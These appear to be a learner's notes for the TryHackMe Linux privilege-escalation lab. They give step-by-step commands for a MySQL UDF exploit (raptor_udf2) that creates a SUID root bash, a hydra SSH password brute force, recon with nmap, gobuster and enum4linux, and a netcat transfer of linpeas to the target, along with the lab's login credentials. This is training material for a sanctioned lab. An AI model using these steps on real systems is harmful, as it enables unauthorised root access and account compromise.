# Overview
https://tryhackme.com/room/linuxprivesc

```
export IP=10.10.191.59
```
# [Service Exploits](setuid-exploit)
The MySQL service is running as root and the "root" user for the service does not have a password assigned. 
We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands 
as root via the MySQL service.

1. Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
1. Compile the raptor\_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
1. Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
1. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
1. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
1. Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
1. Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# Tools
## NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```

## SSH
We are able to ssh using given info:
```
user
password321
```

## hyra
For finding passwords
```
hydra -l user -P /opt/rockyou.txt ssh://$IP
```

## Gobuster
Look for hidden webpages
```
export WORDLIST=/opt/directory-list-2.3-medium.txt
gobuster dir -u "http://$IP" -w $WORDLIST | tee gobuster.log
```

## enum4linux
```
/opt/enum4linx/enum4linx.pl -a $IP | tee enum4linux.log
```

# linpeas!
target terminal:
```
nc -l -p 1234 > /tmp/jake &
```

my terminal:
```
nc $IP $PORT < linpeas.sh
```

Finally, run:
```
chmod +x /tmp/jake
/tmp/jake
```
